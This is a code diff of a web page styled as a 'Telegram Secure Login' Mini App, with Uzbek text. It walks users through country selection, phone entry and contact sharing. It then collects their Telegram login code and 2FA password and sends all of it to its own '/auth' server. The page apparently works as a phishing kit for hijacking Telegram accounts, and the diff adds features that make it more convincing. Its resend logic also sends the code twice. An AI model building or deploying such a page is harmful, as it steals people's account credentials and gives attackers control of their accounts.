@@ -4,6 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Telegram Secure Login</title>
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css">
 
 <style>
 :root{
@@ -15,27 +18,38 @@
   --danger:#ff6b6b;
   --success:#4ade80;
   --radius:16px;
+  --safe-area-inset-bottom: env(safe-area-inset-bottom, 0px);
 }
 
-*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto}
+*{
+  box-sizing:border-box;
+  font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+  -webkit-tap-highlight-color: transparent;
+}
 
 body{
   margin:0;
   background:radial-gradient(circle at top,#1b2735,#0e1621);
-  height:100vh;
+  min-height:100vh;
+  min-height:-webkit-fill-available;
   display:flex;
   align-items:center;
   justify-content:center;
   color:var(--text);
+  padding:20px;
+  padding-bottom: calc(20px + var(--safe-area-inset-bottom));
 }
 
 .card{
-  width:390px;
+  width:100%;
+  max-width:390px;
   background:var(--card);
   border-radius:var(--radius);
   padding:28px;
   box-shadow:0 30px 60px rgba(0,0,0,.45);
   animation:fadeIn .5s ease;
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
 }
 
 @keyframes fadeIn{
@@ -54,8 +68,18 @@ body{
   font-size:30px;
 }
 
-h2{text-align:center;margin:6px 0}
-p{text-align:center;font-size:14px;color:var(--muted);margin-bottom:22px}
+h2{
+  text-align:center;
+  margin:6px 0;
+  font-weight:600;
+}
+p{
+  text-align:center;
+  font-size:14px;
+  color:var(--muted);
+  margin-bottom:22px;
+  line-height:1.4;
+}
 
 .step{
   animation:stepIn .35s ease;
@@ -65,22 +89,55 @@ p{text-align:center;font-size:14px;color:var(--muted);margin-bottom:22px}
   to{opacity:1;transform:none}
 }
 
-input,button{
+.input-group{
+  position:relative;
+  margin-bottom:12px;
+}
+
+.iti{
+  width:100%;
+  display:block !important;
+}
+
+.iti__selected-flag{
+  padding:0 12px;
+}
+
+.iti__country-list{
+  background:var(--card) !important;
+  border-color:#22303c !important;
+  color:var(--text) !important;
+}
+
+.iti__country{
+  color:var(--text) !important;
+}
+
+.iti__country:hover{
+  background:#0e1621 !important;
+}
+
+input, button{
   width:100%;
   padding:14px;
   border-radius:var(--radius);
   font-size:15px;
+  -webkit-appearance: none;
+  appearance: none;
 }
 
 input{
   background:#0e1621;
   border:1px solid #22303c;
   color:var(--text);
-  margin-bottom:12px;
   outline:none;
+  transition:border-color 0.2s;
+  font-size:16px; /* iOS zoom bug fix */
 }
 
-input:focus{border-color:var(--primary)}
+input:focus{
+  border-color:var(--primary);
+}
 
 button{
   background:var(--primary);
@@ -93,23 +150,56 @@ button{
   justify-content:center;
   gap:8px;
   transition:.2s;
+  user-select:none;
+  -webkit-user-select:none;
+  touch-action:manipulation;
 }
 
-button:hover:not(:disabled){background:#1f9fe0}
-button:disabled{opacity:.6;cursor:not-allowed}
+button:hover:not(:disabled),
+button:active:not(:disabled){
+  background:#1f9fe0;
+  transform:translateY(-1px);
+}
 
-.hidden{display:none}
+button:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+  transform:none !important;
+}
+
+.hidden{
+  display:none !important;
+}
 
 .msg{
   text-align:center;
   font-size:14px;
   margin-top:12px;
+  padding:8px;
+  border-radius:8px;
+  animation:slideUp 0.3s ease;
 }
-.msg.error{color:var(--danger)}
-.msg.success{color:var(--success)}
+.msg.error{
+  color:var(--danger);
+  background:rgba(255,107,107,0.1);
+}
+.msg.success{
+  color:var(--success);
+  background:rgba(74,222,128,0.1);
+}
+.msg.info{
+  color:var(--primary);
+  background:rgba(42,171,238,0.1);
+}
+
+@keyframes slideUp{
+  from{opacity:0;transform:translateY(10px)}
+  to{opacity:1;transform:none}
+}
 
 .spinner{
-  width:18px;height:18px;
+  width:18px;
+  height:18px;
   border:2px solid rgba(255,255,255,.3);
   border-top-color:white;
   border-radius:50%;
@@ -122,6 +212,88 @@ button:disabled{opacity:.6;cursor:not-allowed}
   font-size:12px;
   color:var(--muted);
   margin-top:18px;
+  padding-top:12px;
+  border-top:1px solid #22303c;
+}
+
+/* Country Selector Styles */
+.country-selector{
+  margin-bottom:16px;
+}
+
+.country-option{
+  display:flex;
+  align-items:center;
+  padding:12px 16px;
+  background:#0e1621;
+  border:1px solid #22303c;
+  border-radius:var(--radius);
+  margin-bottom:8px;
+  cursor:pointer;
+  transition:all 0.2s;
+}
+
+.country-option:hover{
+  border-color:var(--primary);
+  background:#131e2a;
+}
+
+.country-option.active{
+  border-color:var(--primary);
+  background:rgba(42,171,238,0.1);
+}
+
+.country-emoji{
+  font-size:24px;
+  margin-right:12px;
+  width:32px;
+}
+
+.country-info{
+  flex:1;
+}
+
+.country-name{
+  font-weight:500;
+}
+
+.country-code{
+  font-size:12px;
+  color:var(--muted);
+}
+
+/* Telegram Mini App specific */
+.tg-button{
+  background:#3390ec;
+}
+
+.tg-button:hover{
+  background:#2a7fd8;
+}
+
+/* iOS specific fixes */
+@media (max-width: 480px){
+  .card{
+    padding:20px;
+    margin:10px;
+  }
+  
+  input, button{
+    padding:16px; /* Better touch target */
+  }
+  
+  button{
+    font-size:16px;
+  }
+}
+
+/* Safe area for iPhone X and above */
+@supports(padding: max(0px)){
+  body{
+    padding-left: max(20px, env(safe-area-inset-left));
+    padding-right: max(20px, env(safe-area-inset-right));
+    padding-bottom: max(20px, env(safe-area-inset-bottom));
+  }
 }
 </style>
 </head>
@@ -133,123 +305,430 @@ button:disabled{opacity:.6;cursor:not-allowed}
   <h2>Telegram orqali kirish</h2>
   <p id="desc">Xavfsiz autentifikatsiya</p>
 
-  <!-- SHARE CONTACT -->
+  <!-- COUNTRY SELECTOR -->
+  <div id="countryStep" class="step hidden">
+    <div class="country-selector">
+      <div class="country-option" data-code="998" data-emoji="🇺🇿" onclick="selectCountry(this)">
+        <div class="country-emoji">🇺🇿</div>
+        <div class="country-info">
+          <div class="country-name">O'zbekiston</div>
+          <div class="country-code">+998</div>
+        </div>
+      </div>
+      <div class="country-option" data-code="7" data-emoji="🇷🇺" onclick="selectCountry(this)">
+        <div class="country-emoji">🇷🇺</div>
+        <div class="country-info">
+          <div class="country-name">Rossiya</div>
+          <div class="country-code">+7</div>
+        </div>
+      </div>
+      <div class="country-option" data-code="1" data-emoji="🇺🇸" onclick="selectCountry(this)">
+        <div class="country-emoji">🇺🇸</div>
+        <div class="country-info">
+          <div class="country-name">AQSh</div>
+          <div class="country-code">+1</div>
+        </div>
+      </div>
+      <div class="country-option" data-code="44" data-emoji="🇬🇧" onclick="selectCountry(this)">
+        <div class="country-emoji">🇬🇧</div>
+        <div class="country-info">
+          <div class="country-name">Buyuk Britaniya</div>
+          <div class="country-code">+44</div>
+        </div>
+      </div>
+    </div>
+    <button onclick="showPhoneInput()">Davom etish</button>
+  </div>
+
+  <!-- TELEGRAM SHARE CONTACT -->
   <div id="tgStep" class="step hidden">
-    <button onclick="shareContact()">📞 Telefon raqamni ulashish</button>
+    <p style="margin-bottom:16px;">Telegram hisobingizga ulaning</p>
+    <button class="tg-button" onclick="shareContact()">
+      <span style="font-size:20px;">📱</span>
+      Telefon raqamni ulashish
+    </button>
+    <p style="font-size:12px; margin-top:12px;">
+      <button onclick="showManualLogin()" style="background:none; color:var(--primary); width:auto; padding:4px;">
+        Boshqa usul bilan kirish
+      </button>
+    </p>
   </div>
 
-  <!-- MANUAL PHONE -->
+  <!-- MANUAL PHONE INPUT -->
   <div id="manualStep" class="step hidden">
-    <input id="phone" placeholder="+998901234567">
+    <div class="input-group">
+      <input id="phone" type="tel" placeholder="901234567">
+      <small style="display:block; margin-top:4px; color:var(--muted); font-size:12px;">
+        Tanlangan mamlakat: <span id="selectedCountry">🇺🇿 +998</span>
+      </small>
+    </div>
     <button onclick="sendCode()">Kod yuborish</button>
+    <p style="margin-top:12px;">
+      <button onclick="showCountrySelector()" style="background:none; color:var(--muted); width:auto; padding:4px; font-size:12px;">
+        Mamlakatni o'zgartirish
+      </button>
+    </p>
   </div>
 
-  <!-- CODE -->
+  <!-- VERIFICATION CODE -->
   <div id="codeStep" class="step hidden">
-    <input id="code" placeholder="Telegram kodi">
-    <input id="password" class="hidden" placeholder="2FA parol">
+    <p id="codeInfo">Telegram'dan kelgan kodni kiriting</p>
+    <input id="code" placeholder="6 xonali kod" type="number" pattern="\d*" inputmode="numeric" maxlength="6">
+    <input id="password" class="hidden" placeholder="2FA parol (agar mavjud bo'lsa)" type="password">
     <button id="verifyBtn" onclick="verify()">Tasdiqlash</button>
+    
+    <div style="margin-top:16px; text-align:center;">
+      <button onclick="resendCode()" style="background:none; color:var(--primary); width:auto; font-size:13px;">
+        Kodni qayta yuborish
+      </button>
+      <span style="color:var(--muted); margin:0 8px;">•</span>
+      <button onclick="changePhone()" style="background:none; color:var(--muted); width:auto; font-size:13px;">
+        Raqamni o'zgartirish
+      </button>
+    </div>
   </div>
 
-  <div id="msg" class="msg"></div>
-  <div class="footer">Telegram Mini App • Secure Login</div>
+  <div id="msg" class="msg hidden"></div>
+  
+  <div class="footer">
+    <div>Telegram Mini App</div>
+    <div style="font-size:11px; margin-top:4px;">Secure Login System</div>
+  </div>
 </div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 
 <script>
 const API = "/auth";
 let PHONE = null;
+let SELECTED_COUNTRY = { code: "998", emoji: "🇺🇿", name: "O'zbekiston" };
+let SESSION_DATA = null;
 
+// UI Elements
 const tgStep = document.getElementById("tgStep");
 const manualStep = document.getElementById("manualStep");
 const codeStep = document.getElementById("codeStep");
-const password = document.getElementById("password");
+const countryStep = document.getElementById("countryStep");
 const msgEl = document.getElementById("msg");
 const desc = document.getElementById("desc");
 const verifyBtn = document.getElementById("verifyBtn");
+const phoneInput = document.getElementById("phone");
+const codeInput = document.getElementById("code");
+const passwordInput = document.getElementById("password");
+const codeInfo = document.getElementById("codeInfo");
+const selectedCountrySpan = document.getElementById("selectedCountry");
 
-/* ====== ENV DETECTION (MUHIM QISM) ====== */
+/* ====== INITIALIZATION ====== */
 document.addEventListener("DOMContentLoaded", () => {
-  if (window.Telegram && Telegram.WebApp) {
-    Telegram.WebApp.ready();
-    tgStep.classList.remove("hidden");
+  // Check if running in Telegram WebApp
+  if (window.Telegram?.WebApp) {
+    initTelegramWebApp();
   } else {
-    manualStep.classList.remove("hidden");
+    showCountrySelector();
+  }
+  
+  // iOS specific fixes
+  if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+    document.body.style.webkitUserSelect = 'none';
+    document.body.style.webkitTouchCallout = 'none';
   }
 });
 
-/* ====== UI HELPERS ====== */
-function showMsg(text,type="success"){
-  msgEl.textContent=text;
-  msgEl.className="msg "+type;
+function initTelegramWebApp() {
+  Telegram.WebApp.ready();
+  Telegram.WebApp.expand();
+  
+  // Set theme colors
+  Telegram.WebApp.setHeaderColor('#17212b');
+  Telegram.WebApp.setBackgroundColor('#0e1621');
+  
+  // Show Telegram login option
+  tgStep.classList.remove("hidden");
 }
 
-function setLoading(btn,state){
-  btn.disabled=state;
-  btn.innerHTML = state
-    ? `<div class="spinner"></div> Tekshirilmoqda...`
-    : "Tasdiqlash";
+/* ====== COUNTRY SELECTION ====== */
+function showCountrySelector() {
+  hideAllSteps();
+  countryStep.classList.remove("hidden");
+  msgEl.classList.add("hidden");
 }
 
-/* ====== SHARE CONTACT ====== */
-function shareContact(){
-  Telegram.WebApp.requestContact(res=>{
-    if(res?.phone_number){
-      PHONE=res.phone_number;
+function selectCountry(element) {
+  // Remove active class from all options
+  document.querySelectorAll('.country-option').forEach(opt => {
+    opt.classList.remove('active');
+  });
+  
+  // Add active class to selected
+  element.classList.add('active');
+  
+  // Update selected country
+  SELECTED_COUNTRY = {
+    code: element.dataset.code,
+    emoji: element.dataset.emoji,
+    name: element.querySelector('.country-name').textContent
+  };
+}
+
+function showPhoneInput() {
+  if (!SELECTED_COUNTRY.code) {
+    showMsg("Iltimos, mamlakatni tanlang", "error");
+    return;
+  }
+  
+  selectedCountrySpan.textContent = `${SELECTED_COUNTRY.emoji} +${SELECTED_COUNTRY.code}`;
+  hideAllSteps();
+  manualStep.classList.remove("hidden");
+  
+  // Focus on phone input
+  setTimeout(() => phoneInput.focus(), 300);
+}
+
+function showManualLogin() {
+  showCountrySelector();
+}
+
+/* ====== TELEGRAM CONTACT SHARING ====== */
+function shareContact() {
+  Telegram.WebApp.requestContact((contact) => {
+    if (contact?.phone_number) {
+      PHONE = contact.phone_number;
       sendCode();
     }
   });
 }
 
 /* ====== SEND CODE ====== */
-async function sendCode(){
-  if(!PHONE){
-    PHONE=document.getElementById("phone").value.trim();
-    if(!PHONE) return showMsg("Telefon raqamni kiriting","error");
+async function sendCode() {
+  if (!PHONE) {
+    const phoneNumber = phoneInput.value.trim();
+    if (!phoneNumber) {
+      showMsg("Telefon raqamni kiriting", "error");
+      return;
+    }
+    
+    // Format phone number
+    PHONE = `+${SELECTED_COUNTRY.code}${phoneNumber.replace(/\D/g, '')}`;
   }
-
-  showMsg("Kod yuborilmoqda...");
-  const r = await fetch(`${API}/send-code`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({phone:PHONE})
-  });
-
-  if(!r.ok) return showMsg("Kod yuborilmadi","error");
-
-  desc.textContent="Telegram’dan kelgan kodni kiriting";
-  tgStep.classList.add("hidden");
-  manualStep.classList.add("hidden");
-  codeStep.classList.remove("hidden");
-  showMsg("Kod yuborildi");
+  
+  showMsg("Kod yuborilmoqda...", "info");
+  
+  try {
+    const response = await fetch(`${API}/send-code`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify({
+        phone: PHONE,
+        country: SELECTED_COUNTRY.name
+      })
+    });
+    
+    const data = await response.json();
+    
+    if (!response.ok) {
+      throw new Error(data.detail || "Kod yuborishda xatolik");
+    }
+    
+    // Save session data if provided
+    if (data.session) {
+      SESSION_DATA = data.session;
+    }
+    
+    // Show code input
+    hideAllSteps();
+    codeStep.classList.remove("hidden");
+    
+    // Update info text
+    const maskedPhone = PHONE.replace(/(\d{3})\d{4}(\d{3})/, '$1****$2');
+    codeInfo.innerHTML = `Kod <strong>${maskedPhone}</strong> raqamiga yuborildi`;
+    
+    // Focus on code input
+    setTimeout(() => codeInput.focus(), 300);
+    
+    // Start countdown for resend
+    startResendCountdown();
+    
+    showMsg("Kod yuborildi! Telegram'dan kelgan 6 xonali kodni kiriting.", "success");
+    
+  } catch (error) {
+    showMsg(error.message, "error");
+  }
 }
 
-/* ====== VERIFY CODE / 2FA ====== */
-async function verify(){
-  setLoading(verifyBtn,true);
-
-  const r = await fetch(`${API}/verify-code`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      phone:PHONE,
-      code:document.getElementById("code").value,
-      password:password.value || null
-    })
-  });
-
-  const d = await r.json();
-  setLoading(verifyBtn,false);
-
-  if(!r.ok){
-    if(d.detail==="2FA parol kerak"){
-      password.classList.remove("hidden");
-      return showMsg("2FA parolni kiriting","error");
-    }
-    return showMsg(d.detail || "Xatolik","error");
+/* ====== VERIFY CODE ====== */
+async function verify() {
+  const code = codeInput.value.trim();
+  const password = passwordInput.value;
+  
+  if (!code || code.length < 5) {
+    showMsg("To'liq kodni kiriting", "error");
+    return;
   }
+  
+  setLoading(verifyBtn, true);
+  
+  try {
+    const payload = {
+      phone: PHONE,
+      code: code,
+      session: SESSION_DATA
+    };
+    
+    if (password) {
+      payload.password = password;
+    }
+    
+    const response = await fetch(`${API}/verify-code`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    
+    const data = await response.json();
+    
+    if (!response.ok) {
+      if (data.detail === "2FA_REQUIRED") {
+        passwordInput.classList.remove("hidden");
+        showMsg("Iltimos, 2FA parolini kiriting", "info");
+        passwordInput.focus();
+        return;
+      }
+      throw new Error(data.detail || "Tasdiqlashda xatolik");
+    }
+    
+    // Success
+    showMsg("Muvaffaqiyatli kirildi! 🎉", "success");
+    
+    // If in Telegram WebApp, send data back
+    if (window.Telegram?.WebApp) {
+      Telegram.WebApp.sendData(JSON.stringify({
+        auth: true,
+        user: data.user,
+        phone: PHONE,
+        timestamp: Date.now()
+      }));
+      
+      setTimeout(() => {
+        Telegram.WebApp.close();
+      }, 1500);
+    } else {
+      // For web browser
+      setTimeout(() => {
+        showMsg("Kirish muvaffaqiyatli. Qaytadan yuklanmoqda...", "success");
+        setTimeout(() => {
+          window.location.href = "/dashboard";
+        }, 1000);
+      }, 1000);
+    }
+    
+  } catch (error) {
+    showMsg(error.message, "error");
+  } finally {
+    setLoading(verifyBtn, false);
+  }
+}
 
-  showMsg("Muvaffaqiyatli 🎉");
-  setTimeout(()=>Telegram?.WebApp?.close(),800);
+/* ====== HELPER FUNCTIONS ====== */
+function hideAllSteps() {
+  [tgStep, manualStep, codeStep, countryStep].forEach(step => {
+    step.classList.add("hidden");
+  });
+}
+
+function showMsg(text, type = "info") {
+  msgEl.textContent = text;
+  msgEl.className = `msg ${type}`;
+  msgEl.classList.remove("hidden");
+  
+  // Auto hide success messages after 3 seconds
+  if (type === "success") {
+    setTimeout(() => {
+      msgEl.classList.add("hidden");
+    }, 3000);
+  }
+}
+
+function setLoading(button, isLoading) {
+  if (!button) return;
+  
+  button.disabled = isLoading;
+  button.innerHTML = isLoading 
+    ? `<div class="spinner"></div> Tekshirilmoqda...`
+    : "Tasdiqlash";
+}
+
+function changePhone() {
+  PHONE = null;
+  passwordInput.classList.add("hidden");
+  passwordInput.value = "";
+  codeInput.value = "";
+  
+  if (window.Telegram?.WebApp) {
+    hideAllSteps();
+    tgStep.classList.remove("hidden");
+  } else {
+    showCountrySelector();
+  }
+}
+
+async function resendCode() {
+  // Disable resend for 60 seconds
+  const resendBtn = document.querySelector('button[onclick="resendCode()"]');
+  if (resendBtn.disabled) return;
+  
+  resendBtn.disabled = true;
+  let countdown = 60;
+  
+  const interval = setInterval(() => {
+    resendBtn.innerHTML = `Qayta yuborish (${countdown}s)`;
+    countdown--;
+    
+    if (countdown <= 0) {
+      clearInterval(interval);
+      resendBtn.disabled = false;
+      resendBtn.innerHTML = "Kodni qayta yuborish";
+    }
+  }, 1000);
+  
+  // Resend the code
+  await sendCode();
+}
+
+function startResendCountdown() {
+  resendCode(); // This will start the countdown
+}
+
+/* ====== KEYBOARD HANDLING ====== */
+document.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') {
+    if (!manualStep.classList.contains('hidden')) {
+      sendCode();
+    } else if (!codeStep.classList.contains('hidden')) {
+      verify();
+    }
+  }
+});
+
+// Prevent zoom on input focus in iOS
+document.addEventListener('touchstart', (e) => {
+  if (e.target.tagName === 'INPUT') {
+    e.target.style.fontSize = '16px';
+  }
+}, { passive: true });
+
+// Handle back button in Telegram WebApp
+if (window.Telegram?.WebApp) {
+  Telegram.WebApp.BackButton.onClick(() => {
+    if (!codeStep.classList.contains('hidden')) {
+      changePhone();
+      return false;
+    }
+    Telegram.WebApp.close();
+  });
 }
 </script>
 
